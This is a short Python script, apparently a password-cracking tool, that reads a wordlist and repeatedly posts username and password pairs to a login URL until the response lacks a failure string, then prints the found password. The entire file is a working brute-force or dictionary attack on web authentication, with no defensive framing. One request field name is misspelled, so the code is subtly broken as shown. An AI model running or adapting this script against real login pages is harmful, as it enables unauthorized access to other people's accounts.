import requests
import json
class Crack:
    """
    A simple python class to brute force or dictionary the passwords of a url
    """
    def authenticate(self,url,user_name,password,fail_string):
        myobj = {'j_usernam': user_name,'j_password':password}
        x = requests.post(url, json = myobj)
        response = x.text
        if fail_string in response:
            print("[-] Attempt failed")
        else:
            print("[+] Success "+password)
            quit()
        
    def load_dictionary(self,user_name,password_file,url,fail_string):
        file1 = open(password_file, 'r')
        Lines = file1.readlines()
        count = 0
        for line in Lines:
            count += 1
            self.authenticate(url,user_name,str(line.strip()),fail_string)

crack = Crack()
crack.load_dictionary('admin','myfile.txt','http://www.example.com/login.php','placeholder="Password"')
